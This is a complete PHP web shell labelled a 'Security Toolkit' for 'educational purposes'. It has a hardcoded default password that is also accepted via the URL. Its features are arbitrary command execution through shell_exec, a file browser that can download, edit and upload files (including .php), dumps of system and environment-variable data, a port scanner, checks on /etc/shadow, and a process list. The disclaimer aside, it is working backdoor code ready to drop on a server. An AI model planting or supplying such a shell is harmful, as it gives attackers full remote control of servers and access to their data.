<?php
/* 
 * Advanced PHP Security Toolkit - Web Shell
 * Educational purposes only - DO NOT use in production!
 * Features: File management, system info, network tools, security checks
 * Access: http(s)://host/web_shell.php?pass=<password>
 * Default password: SecureShell2024!
 */

session_start();

// Configuration
$PASSWORD = 'SecureShell2024!';
$MAX_UPLOAD_SIZE = 10 * 1024 * 1024; // 10MB
$ALLOWED_EXTENSIONS = ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'log'];

// Authentication
$auth = $_GET['pass'] ?? $_SESSION['authenticated'] ?? '';
if ($auth !== $PASSWORD && !$_SESSION['authenticated']) {
    if ($_POST['password'] === $PASSWORD) {
        $_SESSION['authenticated'] = true;
    } else {
        showLoginForm();
        exit;
    }
}

$_SESSION['authenticated'] = true;

// Handle actions
$action = $_GET['action'] ?? 'shell';
$output = '';

switch ($action) {
    case 'shell':
        $output = handleShell();
        break;
    case 'files':
        $output = handleFiles();
        break;
    case 'sysinfo':
        $output = handleSysInfo();
        break;
    case 'network':
        $output = handleNetwork();
        break;
    case 'security':
        $output = handleSecurity();
        break;
    case 'upload':
        $output = handleUpload();
        break;
    case 'download':
        handleDownload();
        break;
    case 'edit':
        $output = handleEdit();
        break;
    case 'logout':
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
}

function showLoginForm() {
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Security Toolkit Login</title>
        <style>
            body { font-family: monospace; background: #0d1117; color: #c9d1d9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login { background: #161b22; padding: 2rem; border-radius: 8px; border: 1px solid #30363d; }
            input { background: #21262d; border: 1px solid #30363d; color: #c9d1d9; padding: 0.5rem; margin: 0.5rem 0; width: 200px; }
            button { background: #238636; color: white; border: none; padding: 0.5rem 1rem; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="login">
            <h3>🔒 Security Toolkit</h3>
            <form method="post">
                <input type="password" name="password" placeholder="Enter password" required>
                <br><button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>';
}

function handleShell() {
    $cmd = $_POST['cmd'] ?? '';
    if (!$cmd) return '<em>Enter a command to execute</em>';
    
    $output = '<h6>$ ' . htmlspecialchars($cmd) . '</h6>';
    
    // Security check for dangerous commands
    $dangerous = ['rm -rf', 'format', 'del /f', 'shutdown', 'reboot', 'halt'];
    foreach ($dangerous as $danger) {
        if (stripos($cmd, $danger) !== false) {
            return $output . '<span style="color: #f85149;">⚠️ Dangerous command blocked!</span>';
        }
    }
    
    ob_start();
    $result = shell_exec($cmd . ' 2>&1');
    $shell_output = ob_get_clean();
    
    return $output . '<pre>' . htmlspecialchars($result ?: $shell_output ?: 'No output') . '</pre>';
}

function handleFiles() {
    $dir = $_GET['dir'] ?? getcwd();
    $dir = realpath($dir) ?: getcwd();
    
    $output = '<h5>📁 File Manager - ' . htmlspecialchars($dir) . '</h5>';
    $output .= '<p><a href="?action=files&dir=' . urlencode(dirname($dir)) . '">📁 Parent Directory</a></p>';
    
    if (!is_readable($dir)) {
        return $output . '<span style="color: #f85149;">Directory not readable</span>';
    }
    
    $files = scandir($dir);
    $output .= '<table class="table table-dark table-sm">';
    $output .= '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr>';
    
    foreach ($files as $file) {
        if ($file === '.') continue;
        $filepath = $dir . DIRECTORY_SEPARATOR . $file;
        $is_dir = is_dir($filepath);
        $size = $is_dir ? '-' : formatBytes(filesize($filepath));
        $perms = substr(sprintf('%o', fileperms($filepath)), -4);
        $modified = date('Y-m-d H:i', filemtime($filepath));
        
        $icon = $is_dir ? '📁' : '📄';
        $name = $is_dir ? '<a href="?action=files&dir=' . urlencode($filepath) . '">' . htmlspecialchars($file) . '</a>' : htmlspecialchars($file);
        
        $actions = '';
        if (!$is_dir) {
            $actions .= '<a href="?action=edit&file=' . urlencode($filepath) . '" class="btn btn-sm btn-outline-primary">Edit</a> ';
            $actions .= '<a href="?action=download&file=' . urlencode($filepath) . '" class="btn btn-sm btn-outline-success">Download</a>';
        }
        
        $output .= "<tr><td>$icon $name</td><td>$size</td><td>$perms</td><td>$modified</td><td>$actions</td></tr>";
    }
    
    $output .= '</table>';
    
    // Upload form
    $output .= '<h6>📤 Upload File</h6>';
    $output .= '<form method="post" enctype="multipart/form-data" action="?action=upload&dir=' . urlencode($dir) . '">';
    $output .= '<input type="file" name="upload" class="form-control mb-2">';
    $output .= '<button type="submit" class="btn btn-primary">Upload</button>';
    $output .= '</form>';
    
    return $output;
}

function handleSysInfo() {
    $output = '<h5>💻 System Information</h5>';
    
    $info = [
        'OS' => php_uname(),
        'PHP Version' => phpversion(),
        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'Document Root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
        'Current User' => get_current_user(),
        'Current Directory' => getcwd(),
        'Server IP' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
        'Client IP' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        'Memory Limit' => ini_get('memory_limit'),
        'Max Execution Time' => ini_get('max_execution_time'),
        'Upload Max Size' => ini_get('upload_max_filesize'),
        'Disk Free Space' => formatBytes(disk_free_space('.')),
        'Disk Total Space' => formatBytes(disk_total_space('.'))
    ];
    
    $output .= '<table class="table table-dark">';
    foreach ($info as $key => $value) {
        $output .= '<tr><td><strong>' . htmlspecialchars($key) . '</strong></td><td>' . htmlspecialchars($value) . '</td></tr>';
    }
    $output .= '</table>';
    
    // Environment variables
    $output .= '<h6>🌍 Environment Variables</h6>';
    $output .= '<div style="max-height: 300px; overflow-y: auto;">';
    $output .= '<table class="table table-dark table-sm">';
    foreach ($_ENV as $key => $value) {
        $output .= '<tr><td>' . htmlspecialchars($key) . '</td><td>' . htmlspecialchars($value) . '</td></tr>';
    }
    $output .= '</table></div>';
    
    return $output;
}

function handleNetwork() {
    $output = '<h5>🌐 Network Tools</h5>';
    
    $tool = $_POST['tool'] ?? '';
    $target = $_POST['target'] ?? '';
    
    $output .= '<form method="post" class="mb-3">';
    $output .= '<input type="hidden" name="tool" value="network">';
    $output .= '<div class="input-group">';
    $output .= '<select name="tool" class="form-select">';
    $output .= '<option value="ping">Ping</option>';
    $output .= '<option value="nslookup">DNS Lookup</option>';
    $output .= '<option value="traceroute">Traceroute</option>';
    $output .= '<option value="netstat">Netstat</option>';
    $output .= '<option value="portscan">Port Scan</option>';
    $output .= '</select>';
    $output .= '<input type="text" name="target" class="form-control" placeholder="Target (IP/domain)" value="' . htmlspecialchars($target) . '">';
    $output .= '<button type="submit" class="btn btn-primary">Run</button>';
    $output .= '</div></form>';
    
    if ($tool && $target) {
        $output .= '<h6>Results:</h6><pre>';
        
        switch ($tool) {
            case 'ping':
                $result = shell_exec("ping -c 4 " . escapeshellarg($target) . " 2>&1");
                break;
            case 'nslookup':
                $result = shell_exec("nslookup " . escapeshellarg($target) . " 2>&1");
                break;
            case 'traceroute':
                $result = shell_exec("traceroute " . escapeshellarg($target) . " 2>&1");
                break;
            case 'netstat':
                $result = shell_exec("netstat -tuln 2>&1");
                break;
            case 'portscan':
                $result = portScan($target);
                break;
            default:
                $result = 'Unknown tool';
        }
        
        $output .= htmlspecialchars($result ?: 'No output');
        $output .= '</pre>';
    }
    
    return $output;
}

function handleSecurity() {
    $output = '<h5>🔒 Security Checks</h5>';
    
    // PHP Security Configuration
    $output .= '<h6>PHP Security Settings</h6>';
    $security_settings = [
        'allow_url_fopen' => ini_get('allow_url_fopen') ? '❌ Enabled (Risk)' : '✅ Disabled',
        'allow_url_include' => ini_get('allow_url_include') ? '❌ Enabled (High Risk)' : '✅ Disabled',
        'display_errors' => ini_get('display_errors') ? '❌ Enabled (Info Disclosure)' : '✅ Disabled',
        'expose_php' => ini_get('expose_php') ? '❌ Enabled (Info Disclosure)' : '✅ Disabled',
        'register_globals' => ini_get('register_globals') ? '❌ Enabled (High Risk)' : '✅ Disabled',
        'safe_mode' => ini_get('safe_mode') ? '✅ Enabled' : '❌ Disabled'
    ];
    
    $output .= '<table class="table table-dark">';
    foreach ($security_settings as $setting => $status) {
        $output .= '<tr><td>' . htmlspecialchars($setting) . '</td><td>' . $status . '</td></tr>';
    }
    $output .= '</table>';
    
    // File Permissions Check
    $output .= '<h6>Critical File Permissions</h6>';
    $critical_files = ['/etc/passwd', '/etc/shadow', '/etc/hosts', '.htaccess', 'config.php'];
    $output .= '<table class="table table-dark table-sm">';
    
    foreach ($critical_files as $file) {
        if (file_exists($file)) {
            $perms = substr(sprintf('%o', fileperms($file)), -4);
            $readable = is_readable($file) ? '✅' : '❌';
            $writable = is_writable($file) ? '⚠️' : '✅';
            $output .= '<tr><td>' . htmlspecialchars($file) . '</td><td>' . $perms . '</td><td>R:' . $readable . ' W:' . $writable . '</td></tr>';
        }
    }
    $output .= '</table>';
    
    // Process List
    $output .= '<h6>Running Processes</h6>';
    $processes = shell_exec('ps aux 2>/dev/null || tasklist 2>/dev/null');
    $output .= '<div style="max-height: 300px; overflow-y: auto;"><pre>' . htmlspecialchars($processes ?: 'Could not retrieve process list') . '</pre></div>';
    
    return $output;
}

function handleUpload() {
    $dir = $_GET['dir'] ?? getcwd();
    
    if (!isset($_FILES['upload'])) {
        return '<span style="color: #f85149;">No file uploaded</span>';
    }
    
    $file = $_FILES['upload'];
    $filename = basename($file['name']);
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    
    // Security checks
    if ($file['size'] > $GLOBALS['MAX_UPLOAD_SIZE']) {
        return '<span style="color: #f85149;">File too large</span>';
    }
    
    if (!in_array($extension, $GLOBALS['ALLOWED_EXTENSIONS'])) {
        return '<span style="color: #f85149;">File type not allowed</span>';
    }
    
    $target = $dir . DIRECTORY_SEPARATOR . $filename;
    
    if (move_uploaded_file($file['tmp_name'], $target)) {
        return '<span style="color: #238636;">✅ File uploaded successfully: ' . htmlspecialchars($filename) . '</span>';
    } else {
        return '<span style="color: #f85149;">Upload failed</span>';
    }
}

function handleDownload() {
    $file = $_GET['file'] ?? '';
    
    if (!file_exists($file) || !is_readable($file)) {
        http_response_code(404);
        echo 'File not found';
        return;
    }
    
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

function handleEdit() {
    $file = $_GET['file'] ?? '';
    $content = '';
    
    if ($_POST['save'] ?? false) {
        $content = $_POST['content'] ?? '';
        if (file_put_contents($file, $content) !== false) {
            $output = '<div class="alert alert-success">File saved successfully!</div>';
        } else {
            $output = '<div class="alert alert-danger">Failed to save file!</div>';
        }
    }
    
    if (file_exists($file) && is_readable($file)) {
        $content = file_get_contents($file);
    }
    
    $output .= '<h5>📝 Edit File: ' . htmlspecialchars(basename($file)) . '</h5>';
    $output .= '<form method="post">';
    $output .= '<textarea name="content" class="form-control" rows="20" style="font-family: monospace;">' . htmlspecialchars($content) . '</textarea>';
    $output .= '<br><button type="submit" name="save" value="1" class="btn btn-success">Save File</button> ';
    $output .= '<a href="?action=files&dir=' . urlencode(dirname($file)) . '" class="btn btn-secondary">Back to Files</a>';
    $output .= '</form>';
    
    return $output;
}

function portScan($host, $ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389]) {
    $result = "Port scan results for $host:\n";
    
    foreach ($ports as $port) {
        $connection = @fsockopen($host, $port, $errno, $errstr, 2);
        if ($connection) {
            $result .= "Port $port: OPEN\n";
            fclose($connection);
        } else {
            $result .= "Port $port: CLOSED\n";
        }
    }
    
    return $result;
}

function formatBytes($size, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    
    for ($i = 0; $size > 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }
    
    return round($size, $precision) . ' ' . $units[$i];
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PHP Security Toolkit</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: #0d1117;
            color: #c9d1d9;
            font-family: "Fira Code", "Consolas", monospace;
        }
        .navbar {
            background: #161b22 !important;
            border-bottom: 1px solid #30363d;
        }
        .navbar-brand, .nav-link {
            color: #c9d1d9 !important;
        }
        .nav-link:hover {
            color: #58a6ff !important;
        }
        .nav-link.active {
            color: #238636 !important;
            font-weight: bold;
        }
        .terminal {
            background: #161b22;
            color: #c9d1d9;
            padding: 1rem;
            min-height: 400px;
            border-radius: 0.5rem;
            border: 1px solid #30363d;
            overflow-y: auto;
        }
        .table-dark {
            --bs-table-bg: #161b22;
            --bs-table-border-color: #30363d;
        }
        .form-control, .form-select {
            background: #21262d;
            border: 1px solid #30363d;
            color: #c9d1d9;
        }
        .form-control:focus, .form-select:focus {
            background: #21262d;
            border-color: #58a6ff;
            color: #c9d1d9;
            box-shadow: 0 0 0 0.2rem rgba(88, 166, 255, 0.25);
        }
        .btn-primary {
            background: #238636;
            border-color: #238636;
        }
        .btn-primary:hover {
            background: #2ea043;
            border-color: #2ea043;
        }
        pre {
            background: #0d1117;
            border: 1px solid #30363d;
            padding: 1rem;
            border-radius: 0.375rem;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark">
        <div class="container">
            <span class="navbar-brand">🔒 PHP Security Toolkit</span>
            <div class="navbar-nav ms-auto">
                <a class="nav-link <?= $action === 'shell' ? 'active' : '' ?>" href="?action=shell">🖥️ Shell</a>
                <a class="nav-link <?= $action === 'files' ? 'active' : '' ?>" href="?action=files">📁 Files</a>
                <a class="nav-link <?= $action === 'sysinfo' ? 'active' : '' ?>" href="?action=sysinfo">💻 System</a>
                <a class="nav-link <?= $action === 'network' ? 'active' : '' ?>" href="?action=network">🌐 Network</a>
                <a class="nav-link <?= $action === 'security' ? 'active' : '' ?>" href="?action=security">🔒 Security</a>
                <a class="nav-link" href="?action=logout">🚪 Logout</a>
            </div>
        </div>
    </nav>

    <div class="container py-4">
        <?php if ($action === 'shell'): ?>
            <h3>🖥️ Command Shell</h3>
            <form method="post" class="input-group mb-3">
                <input type="text" class="form-control" name="cmd" placeholder="Enter command" autofocus value="<?= htmlspecialchars($_POST['cmd'] ?? '') ?>">
                <button class="btn btn-primary" type="submit">Execute</button>
            </form>
        <?php endif; ?>
        
        <div class="terminal">
            <?= $output ?: '<em>Welcome to PHP Security Toolkit</em>' ?>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Auto-scroll terminal
        const terminal = document.querySelector('.terminal');
        if (terminal) {
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'l') {
                e.preventDefault();
                document.querySelector('input[name="cmd"]')?.focus();
            }
        });
    </script>
</body>
</html>
